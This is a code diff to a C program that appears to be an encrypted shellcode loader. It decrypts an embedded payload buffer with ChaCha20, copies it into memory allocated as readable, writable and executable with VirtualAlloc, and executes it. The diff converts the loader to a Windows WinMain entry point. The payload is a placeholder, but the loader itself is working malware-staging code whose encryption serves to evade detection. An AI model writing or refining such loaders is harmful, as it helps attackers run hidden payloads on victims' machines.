@@ -1,5 +1,6 @@
-__attribute__((section(".text")))
-unsigned char buf[] = </*shellcode*/>;
+#include <windows.h>
+
+unsigned char buf[] = { /* <shellcode> */ };
 
 const unsigned int KEY[8] = {
     0x03020100, 0x07060504, 0x0b0a0908, 0x0f0e0d0c,
@@ -55,8 +56,11 @@ void chacha20_decrypt(unsigned char* data, unsigned int len) {
     }
 }
 
-int main() {
-    chacha20_decrypt(buf, sizeof(buf) - 1);
-    (*(void(*)())(&buf))();
+int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
+    chacha20_decrypt(buf, sizeof(buf));
+    void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    unsigned char* dst = (unsigned char*)exec;
+    for (unsigned int i = 0; i < sizeof(buf); i++) dst[i] = buf[i];
+    ((void(*)())exec)();
     return 0;
 }
